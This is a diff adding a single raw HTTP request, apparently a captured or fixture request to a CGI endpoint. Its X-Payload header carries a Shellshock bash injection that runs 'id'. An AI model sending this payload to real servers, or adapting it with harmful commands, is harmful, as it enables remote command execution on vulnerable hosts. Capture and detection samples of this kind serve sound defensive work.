@@ -1,0 +1,14 @@
+GET /cgi-bin/status HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 145.200.203.103
+Accept: */*
+User-Agent: curl/8.4.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 28.246.205.16,50.34.106.113
+X-Cloud-Trace-Context: 99c94309570dc1951c2442f9298cb3a5/944285119013034077
+X-Payload: () { :; }; /bin/bash -c 'id'
+
